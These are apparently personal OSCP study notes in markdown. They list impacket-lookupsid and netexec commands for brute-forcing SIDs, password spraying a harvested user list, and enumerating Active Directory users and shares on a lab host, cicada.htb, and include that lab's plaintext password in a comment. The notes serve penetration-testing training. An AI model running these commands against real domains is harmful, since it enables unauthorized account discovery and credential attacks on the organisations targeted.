Also check out:

https://github.com/nestef23/my-OSCP-notes/blob/main/Reconnaissance/SMB%20-%20445.md

## lookupsid
lookupsid.py
### Enumerate users
https://github.com/fortra/impacket/blob/master/examples/lookupsid.py

This tool will try brute forcing Windows Security Identifiers (SIDs) of any users in the AD domain.

To enumerate the domain, we can specify the `guest` user, the domain name, and `-no-pass` for no password. 
```
# No pass
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
impacket-lookupsid support@cicada.htb -no-pass

# Known pass
impacket-lookupsid user.name@cicada.htb
```

## netexec
### Password spraying
In this scenario we want to perform password spraying with a known password.
1. Gett all usernames
2. Try the password against all of them
```
impacket-lookupsid support@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt

cat users.txt

netexec smb cicada.htb -u users.txt -p '<password>'
```
### Enumerate users
Must have user credentials.
This will show "description" field from the AD.
```
# netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
netexec smb <domain> -u <user> -p '<password>' --users
```
### Enumerate shares
Must have user credentials.
This will show user permissions to each share
```
netexec smb <domain> -u <user> -p '<password>' --shares
```
